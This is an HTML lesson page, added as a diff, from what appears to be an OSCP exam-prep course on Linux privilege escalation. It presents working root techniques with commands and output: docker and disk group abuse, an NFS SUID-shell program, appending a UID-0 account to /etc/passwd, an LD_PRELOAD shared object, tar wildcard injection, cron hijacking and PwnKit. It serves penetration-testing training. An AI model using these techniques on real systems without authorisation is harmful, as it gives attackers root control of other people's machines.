@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lesson 06 · Linux Privilege Escalation</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="../reference/links.html">Links</a> · <a href="./0005-exploiting-the-web-foothold.html">Lesson 05</a> · <strong>Lesson 06</strong> · <a href="../reference/linux-privesc.html">Linux privesc</a> · <a href="../reference/glossary.html">Glossary</a></nav>
+
+<span class="kicker">Lesson 06 · Privilege Escalation</span>
+<h1>Linux Privilege Escalation</h1>
+<p class="meta">Mission: pass the OSCP+ exam · Your win today: take a low-priv shell to root by finding the one misconfiguration.</p>
+
+<p class="lead">You have a shell as <code>www-data</code>. That's 10 points; root is the other 10. The good news: privilege escalation is the same skill you already drilled in Lesson 03 — <strong>enumeration</strong> — just pointed inward. You don't need a clever exploit. You need to find the <em>one</em> thing this box got wrong, and the box almost always got something wrong. You already understand processes, file permissions, and how a loader resolves a library; privesc is just learning which of those an attacker leans on.</p>
+
+<div class="box mantra">
+You don't have to break everything.<br>
+You just have to find one misconfiguration.
+</div>
+
+<h2>Step 0 · Stabilise your shell first</h2>
+<p>A foothold shell from a web exploit is usually a dumb pipe: no tab-completion, no arrow keys, no job control, and it dies the moment you fat-finger <kbd>Ctrl-C</kbd>. Fix that <em>before</em> you start hunting — half-typed commands and a dropped shell waste real exam minutes. Upgrade to a proper TTY:</p>
+<pre><span class="p">$</span> <span class="o">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>   <span class="c"># real bash</span>
+<span class="p">$</span> <span class="o">Ctrl-Z</span>                                            <span class="c"># background it</span>
+<span class="p">$</span> <span class="o">stty raw -echo; fg</span>                                <span class="c"># hand your terminal to the shell</span>
+<span class="p">$</span> <span class="o">export TERM=xterm; export SHELL=/bin/bash</span>          <span class="c"># now clear/less/vi behave</span></pre>
+<p>Now you have history, completion, and a shell that survives a stray keypress. <em>Then</em> start enumerating.</p>
+
+<h2>Step 1 · Situate yourself</h2>
+<p>Before hunting, know where you stand. Three commands answer "who am I and what can I already do?" — and the first one alone solves a huge share of OSCP boxes:</p>
+<pre><span class="p">$</span> <span class="o">sudo -l</span>          <span class="c"># what may I run as root? (the cheapest win)</span>
+<span class="p">$</span> <span class="o">id; whoami</span>      <span class="c"># my user, groups (docker? lxd? disk? = a path)</span>
+<span class="p">$</span> <span class="o">uname -a</span>        <span class="c"># kernel + arch (note it, don't rush to exploit)</span></pre>
+
+<h2>Step 2 · Enumerate broadly — then read the output</h2>
+<p>Run <a href="https://github.com/peass-ng/PEASS-ng">LinPEAS</a> to sweep the host fast, but <em>read</em> what it flags rather than outsourcing your judgement. The vectors it surfaces are almost always one of these:</p>
+<table>
+<thead><tr><th>Vector</th><th>The tell</th><th>The move</th></tr></thead>
+<tbody>
+<tr><td><strong>sudo rights</strong></td><td><code>sudo -l</code> lists an allowed binary</td><td>Look it up on <a href="https://gtfobins.github.io/">GTFOBins</a> → spawn a root shell</td></tr>
+<tr><td><strong>SUID binary</strong></td><td><code>find / -perm -4000</code> shows an odd one</td><td>GTFOBins the binary → run as its owner (root)</td></tr>
+<tr><td><strong>Cron job</strong></td><td>A root cron runs a script <em>you can write</em></td><td>Inject your command into the script; wait for the run</td></tr>
+<tr><td><strong>Capabilities</strong></td><td><code>getcap -r /</code> shows <code>cap_setuid</code></td><td>Abuse it (e.g. a Python with setuid) to become root</td></tr>
+<tr><td><strong>Writable path / PATH</strong></td><td>Root script calls a binary by relative name</td><td>Plant your own binary earlier in <code>PATH</code></td></tr>
+<tr><td><strong>Stray credentials</strong></td><td>Passwords in configs, history, <code>.ssh</code> keys</td><td>Reuse them — <code>su</code>, SSH, or sudo as that user</td></tr>
+<tr><td><strong>Group membership</strong></td><td><code>id</code> shows <code>docker</code>, <code>lxd</code>, or <code>disk</code></td><td>Mount or read the host filesystem as root</td></tr>
+<tr><td><strong>NFS export</strong></td><td><code>/etc/exports</code> has <code>no_root_squash</code></td><td>Drop a root-owned SUID shell from your box</td></tr>
+<tr><td><strong>Writable /etc/passwd</strong></td><td>The file is group/world-writable</td><td>Append a UID-0 user with a known password</td></tr>
+<tr><td><strong>sudo env_keep</strong></td><td><code>sudo -l</code> keeps <code>LD_PRELOAD</code> / <code>LD_LIBRARY_PATH</code></td><td>Preload a malicious <code>.so</code> into the root command</td></tr>
+<tr><td><strong>Wildcard injection</strong></td><td>Root script runs <code>tar/chown/rsync *</code> in a dir you own</td><td>Plant filenames that become command-line flags</td></tr>
+<tr><td><strong>pkexec / Polkit</strong></td><td>SUID <code>pkexec</code> present, host unpatched (pre-2022)</td><td>PwnKit (CVE-2021-4034) → near-universal local root</td></tr>
+<tr><td><strong>Kernel exploit</strong></td><td>Old <code>uname -a</code> + a matching CVE</td><td><em>Last resort</em> — can crash the box</td></tr>
+</tbody>
+</table>
+
+<div class="box warn">
+<span class="box-title">Order matters — don't reach for the kernel first</span>
+Work cheap-and-safe before risky: <strong>sudo -l and stray creds → SUID / SGID / capabilities / cron → group / NFS / PATH → kernel and pkexec last</strong>. A kernel exploit can panic the box and cost you the machine (and exam time); a memory-corruption local root like PwnKit is more reliable but still a real exploit, so try the misconfigurations first. Most OSCP boxes fall to a config mistake, not a CVE.
+</div>
+
+<h2>More paths to root — the exact moves</h2>
+<p>The table is the map; here are the commands for the vectors a software engineer hasn't usually seen before. Each one is a <strong>misconfiguration</strong>, not a memory bug, so they're reliable and exam-safe.</p>
+
+<h3>Dangerous group membership (docker / lxd / disk)</h3>
+<p>Some groups are <em>root by design</em>. If <code>id</code> puts you in one, you're effectively done:</p>
+<pre><span class="c"># docker group: run a container that bind-mounts the host root, then chroot in</span>
+<span class="p">$</span> <span class="o">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span>
+<span class="p">#</span> <span class="o">id</span>
+<span class="h">uid=0(root) gid=0(root)</span>
+
+<span class="c"># disk group: raw read/write to the disk device — read shadow without being root</span>
+<span class="p">$</span> <span class="o">debugfs /dev/sda1</span>
+<span class="o">debugfs:  cat /etc/shadow</span></pre>
+<p>The <code>lxd</code>/<code>lxc</code> group is the same idea: import a tiny image, launch a <code>security.privileged=true</code> container, mount the host's <code>/</code> inside it, and read or write root-owned files. Whenever you see one of these groups, stop and take the gift — it's worth the full 10 points.</p>
+
+<h3>NFS — <code>no_root_squash</code></h3>
+<p>By default NFS "squashes" a remote root down to <code>nobody</code>. With <code>no_root_squash</code>, a file you create as root <em>over the share</em> stays root-owned on the target. So craft a SUID-root shell from your attacker box and run it on the target:</p>
+<pre><span class="c"># on the target — find the misconfigured export</span>
+<span class="p">$</span> <span class="o">cat /etc/exports</span>
+<span class="o">/srv/share *(rw,no_root_squash)</span>
+
+<span class="c"># on YOUR attacker box (as root) — mount it and plant a SUID shell</span>
+<span class="p">#</span> <span class="o">mount -o rw 10.10.10.5:/srv/share /mnt</span>
+<span class="p">#</span> <span class="o">printf 'int main(){setgid(0);setuid(0);system("/bin/bash");}' &gt; /mnt/r.c</span>
+<span class="p">#</span> <span class="o">gcc /mnt/r.c -o /mnt/rootsh &amp;&amp; chmod +s /mnt/rootsh</span>
+
+<span class="c"># back on the target — the binary is root-owned and SUID</span>
+<span class="p">$</span> <span class="o">/srv/share/rootsh</span>
+<span class="p">#</span> <span class="o">id</span>
+<span class="h">uid=0(root) gid=0(root)</span></pre>
+<p class="cite">Compile statically (or on the target) if the target's libc differs from your attacker box.</p>
+
+<h3>Writable <code>/etc/passwd</code> — add your own root</h3>
+<p>If <code>/etc/passwd</code> is writable, you don't need to crack anyone — just add a second UID-0 account with a password you choose:</p>
+<pre><span class="p">$</span> <span class="o">openssl passwd -1 -salt xy hunter2</span>      <span class="c"># make a crypt(3) hash</span>
+<span class="h">$1$xy$8b1.../</span>
+<span class="p">$</span> <span class="o">echo 'pwn:$1$xy$8b1.../:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</span>
+<span class="p">$</span> <span class="o">su pwn</span>                                 <span class="c"># password: hunter2</span>
+<span class="p">#</span> <span class="o">id</span>
+<span class="h">uid=0(root) gid=0(root)</span></pre>
+<p>The historical <code>x</code> in the password field means "look in <code>/etc/shadow</code>"; put a real hash there instead and the system trusts it. Adding an account is quieter than touching the existing <code>root</code> line — leave the real one alone.</p>
+
+<h3><code>LD_PRELOAD</code> / <code>LD_LIBRARY_PATH</code> via sudo <code>env_keep</code></h3>
+<p>If <code>sudo -l</code> shows <code>env_keep+=LD_PRELOAD</code> (or <code>LD_LIBRARY_PATH</code>), sudo will carry that variable into the elevated command. The dynamic loader honours <code>LD_PRELOAD</code> for SUID-aware contexts here, so a shared object with a constructor runs as root:</p>
+<pre><span class="p">$</span> <span class="o">sudo -l</span>
+<span class="o">    env_keep+=LD_PRELOAD, (root) NOPASSWD: /usr/sbin/apache2ctl</span>
+<span class="p">$</span> <span class="o">cat &gt; /tmp/x.c &lt;&lt;'EOF'</span>
+<span class="o">#include &lt;stdlib.h&gt;</span>
+<span class="o">void _init(){ setgid(0); setuid(0); system("/bin/bash"); }</span>
+<span class="o">EOF</span>
+<span class="p">$</span> <span class="o">gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c</span>
+<span class="p">$</span> <span class="o">sudo LD_PRELOAD=/tmp/x.so /usr/sbin/apache2ctl</span>
+<span class="p">#</span> <span class="o">id</span>
+<span class="h">uid=0(root) gid=0(root)</span></pre>
+<p>The command you target is irrelevant — the loader runs your <code>.so</code> first, before <code>apache2ctl</code> ever does anything.</p>
+
+<h3>Wildcard injection (tar / chown / rsync)</h3>
+<p>When a root script runs a command with a bare <code>*</code> in a directory you can write to, the shell expands <code>*</code> to your filenames — and many tools read filenames that start with <code>-</code> as <strong>options</strong>. Name a file after a dangerous flag and you've injected an argument. Classic <code>tar</code> checkpoint trick:</p>
+<pre><span class="c"># root cron runs:  cd /opt/backups &amp;&amp; tar czf /root/bk.tgz *</span>
+<span class="p">$</span> <span class="o">cd /opt/backups</span>
+<span class="p">$</span> <span class="o">echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; x.sh</span>
+<span class="p">$</span> <span class="o">echo '' &gt; '--checkpoint=1'</span>
+<span class="p">$</span> <span class="o">echo '' &gt; '--checkpoint-action=exec=sh x.sh'</span>
+<span class="c"># next run: tar treats the filenames as flags and executes x.sh as root</span>
+<span class="p">$</span> <span class="o">/tmp/rootbash -p</span>
+<span class="p">#</span> <span class="o">id</span>
+<span class="h">euid=0(root)</span></pre>
+<p>The same shape works for <code>chown --reference=…</code> and <code>rsync -e …</code>. Whenever a privileged job globs files in your directory, you control its arguments.</p>
+
+<h3>pkexec / Polkit — PwnKit (CVE-2021-4034)</h3>
+<p>One near-universal fallback: <strong>PwnKit</strong>. The SUID <code>pkexec</code> binary shipped on virtually every major distro and, before the January 2022 patch, a memory-corruption bug gave local root <em>regardless of sudo or group config</em>. Confirm and fire:</p>
+<pre><span class="p">$</span> <span class="o">ls -l /usr/bin/pkexec</span>
+<span class="o">-rwsr-xr-x 1 root root ... /usr/bin/pkexec</span>     <span class="c"># SUID set = candidate</span>
+<span class="p">$</span> <span class="o">./PwnKit</span>                                  <span class="c"># prebuilt exploit (one binary, no args)</span>
+<span class="p">#</span> <span class="o">id</span>
+<span class="h">uid=0(root) gid=0(root)</span></pre>
+<p>It's reliable, but it <em>is</em> an exploit, not a misconfiguration — so it sits near the bottom of your order, just above a kernel CVE. Great when an old box has no obvious misconfig; never your first move.</p>
+
+<h2>Worked example — sudo to root in one line</h2>
+<p>The single most common OSCP Linux privesc. <code>sudo -l</code> returns:</p>
+<pre><span class="o">User www-data may run the following commands on host:</span>
+<span class="o">    (root) NOPASSWD: /usr/bin/find</span></pre>
+<p><a href="https://gtfobins.github.io/gtfobins/find/">GTFOBins → find</a> tells you <code>find</code> can run a command via <code>-exec</code>. So:</p>
+<pre><span class="p">$</span> <span class="o">sudo find . -exec /bin/sh \; -quit</span>
+<span class="p">#</span> <span class="o">id</span>
+<span class="h">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="p">#</span> <span class="o">cat /root/proof.txt</span></pre>
+<p>Root. Grab the proof file — that's the second 10 points. The pattern generalises: <em>find what you're allowed to run, then make it run a shell.</em></p>
+
+<h2>Worked example 2 — writable root cron → <code>/bin/bash -p</code></h2>
+<p>No sudo rights this time. LinPEAS flags a cron entry that runs as root, and the script it calls is world-writable — a permission mistake, not a vulnerability:</p>
+<pre><span class="p">$</span> <span class="o">cat /etc/crontab</span>
+<span class="o">* * * * * root /usr/local/bin/backup.sh</span>
+<span class="p">$</span> <span class="o">ls -l /usr/local/bin/backup.sh</span>
+<span class="h">-rwxrwxrwx 1 root root 184 backup.sh</span>        <span class="c"># anyone can write it</span></pre>
+<p>Append a line that makes <code>bash</code> itself SUID-root, then wait one tick and launch it with <code>-p</code> (which keeps the elevated euid instead of dropping it):</p>
+<pre><span class="p">$</span> <span class="o">echo 'chmod +s /bin/bash' &gt;&gt; /usr/local/bin/backup.sh</span>
+<span class="c"># ...wait up to 60s for the next cron run...</span>
+<span class="p">$</span> <span class="o">ls -l /bin/bash</span>
+<span class="h">-rwsr-sr-x 1 root root ... /bin/bash</span>
+<span class="p">$</span> <span class="o">/bin/bash -p</span>
+<span class="p">bash-5.1#</span> <span class="o">id</span>
+<span class="h">uid=33(www-data) euid=0(root) gid=33(www-data) egid=0(root)</span></pre>
+<p>Same lesson as the sudo example: <em>find something root runs, then make it run your code.</em> Two boxes, two vectors, identical mindset.</p>
+
+<h2>Your enumeration order — a recap</h2>
+<p>When you land on a fresh box, walk this priority list top to bottom. Cheap and safe first; the things that can break the box are last.</p>
+<ol class="steps">
+<li><strong>Stabilise your shell</strong> (TTY upgrade), then <code>sudo -l</code> and a sweep for <strong>stray credentials</strong> (configs, history, <code>.ssh</code>, DB strings). The cheapest wins live here.</li>
+<li><strong>SUID / SGID binaries, capabilities, and writable cron</strong> — <code>find / -perm -4000</code>, <code>getcap -r /</code>, and any root job you can edit. Check each against <a href="https://gtfobins.github.io/">GTFOBins</a>.</li>
+<li><strong>Group membership, NFS exports, and writable PATH</strong> — <code>id</code> for <code>docker</code>/<code>lxd</code>/<code>disk</code>, <code>/etc/exports</code> for <code>no_root_squash</code>, and any script calling a binary by relative name.</li>
+<li><strong>Kernel exploit and pkexec/PwnKit — last.</strong> Only when the misconfigurations are exhausted, because they're real exploits that can crash or are noisy.</li>
+</ol>
+
+<h2>Check yourself</h2>
+<p>Pick the best move. Retrieve before reasoning — feedback below each.</p>
+<div class="quiz" id="quiz"></div>
+
+<div class="primary">
+<span class="box-title">▶ Primary source — bookmark these two</span>
+<a href="https://gtfobins.github.io/">GTFOBins</a> is the page you'll open most for Linux privesc — it tells you exactly how to abuse a sudo/SUID binary. Pair it with the <a href="https://book.hacktricks.wiki/">HackTricks</a> Linux Privilege Escalation checklist for the full enumeration sweep.<sup class="ref"><a href="#s1">1</a></sup>
+</div>
+
+<div class="box tip">
+<span class="box-title">Do this before Lesson 07</span>
+On a box where you already have a low-priv shell (from Lesson 05, or any easy box), run <code>sudo -l</code> and LinPEAS, then escalate to root <em>by hand</em> via one vector — and on a second box, try a different one (cron, SUID, or a group). Record the exact path in your notes under "Privilege escalation". Owning a box end to end — foothold <em>and</em> root — is the whole exam in miniature.
+</div>
+
+<div class="box note">
+<span class="box-title">Practice these boxes</span>
+<strong>Start:</strong> <strong>Bashed</strong> (sudo → writable root cron) &amp; <strong>Shocker</strong> (Shellshock → <code>sudo perl</code>) — HTB · Linux · Easy. <strong>Then:</strong> Beep (many paths), PG Clue. <a href="../reference/practice-boxes.html#pb-06">→ Full box map for this lesson</a>.
+</div>
+
+<div class="teacher">
+<span class="box-title">I'm your teacher — ask me anything</span>
+Paste me your <code>sudo -l</code>, <code>id</code>, or LinPEAS output and we'll spot the vector together. Next: <strong>Lesson 07 — Windows privilege escalation</strong> — same mindset, different operating system (services, tokens, and the misconfigurations Windows loves).
+</div>
+
+<h2>Sources</h2>
+<ol class="sources">
+<li id="s1"><a href="https://gtfobins.github.io/">GTFOBins</a> · <a href="https://book.hacktricks.wiki/">HackTricks (Linux PrivEsc)</a> · <a href="https://github.com/peass-ng/PEASS-ng">LinPEAS</a> · <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">Qualys — PwnKit (CVE-2021-4034)</a>. Local commands: <a href="../reference/linux-privesc.html">Linux privesc cheatsheet</a>.</li>
+</ol>
+
+<footer>
+<span><a href="./0005-exploiting-the-web-foothold.html">← Lesson 05: Exploiting the Web Foothold</a></span>
+<span><a href="./0007-windows-privilege-escalation.html">Next → Lesson 07: Windows Privilege Escalation</a></span>
+</footer>
+
+<script src="../assets/quiz.js"></script>
+<script>
+renderQuiz('quiz', [
+  {
+    prompt: "You just landed a low-priv shell on a Linux box. Which move is the cheapest first check for root?",
+    options: ["Compile a matching kernel exploit", "Reboot the box to clear its state", "Run sudo -l to list allowed commands", "Brute-force the root account password"],
+    answer: 2,
+    explain: "sudo -l is free and frequently hands you a one-line root via GTFOBins — always your first move."
+  },
+  {
+    prompt: "id shows you're a member of the docker group. What's the path to root?",
+    options: ["Restart the Docker daemon as root", "Mount the host filesystem in a container", "Read the Docker API documentation", "Wait for an admin to grant you sudo"],
+    answer: 1,
+    explain: "A docker-group user can run a container that bind-mounts / and chroot into it as root — group membership is root by design."
+  },
+  {
+    prompt: "sudo -l shows env_keep+=LD_PRELOAD for a command you may run. What do you build?",
+    options: ["A static copy of the target's kernel", "A wordlist of the user's old passwords", "A cron job that fires on the next tick", "A malicious shared object the loader preloads"],
+    answer: 3,
+    explain: "Build a .so with a constructor that spawns a shell; env_keep carries LD_PRELOAD into the root command and the loader runs it first."
+  },
+  {
+    prompt: "/etc/exports lists a share with no_root_squash. From your attacker box you can:",
+    options: ["Drop a root-owned SUID shell on the share", "Read the kernel version of the target host", "Reset the NFS daemon to its defaults", "Sniff cleartext credentials off the wire"],
+    answer: 0,
+    explain: "no_root_squash keeps files you create as root over NFS root-owned on the target, so a SUID-root shell placed there runs as root."
+  },
+  {
+    prompt: "Which vector belongs LAST in your order because it can crash the box?",
+    options: ["Checking sudo -l for allowed commands", "A kernel exploit matching uname -a", "Reusing a password found in a config", "Abusing a writable root cron job"],
+    answer: 1,
+    explain: "Kernel exploits can panic the machine; exhaust the safe misconfiguration vectors before risking the box and your exam time."
+  },
+  {
+    prompt: "/etc/passwd is world-writable. The fastest win is to:",
+    options: ["Comment out the nobody account", "Delete the existing root entry", "Append a new user with UID 0", "Change every shell to /bin/false"],
+    answer: 2,
+    explain: "Add a line with a known password hash and UID 0, then su to it — instant root without touching the real root account."
+  }
+]);
+</script>
+
+</body>
+</html>
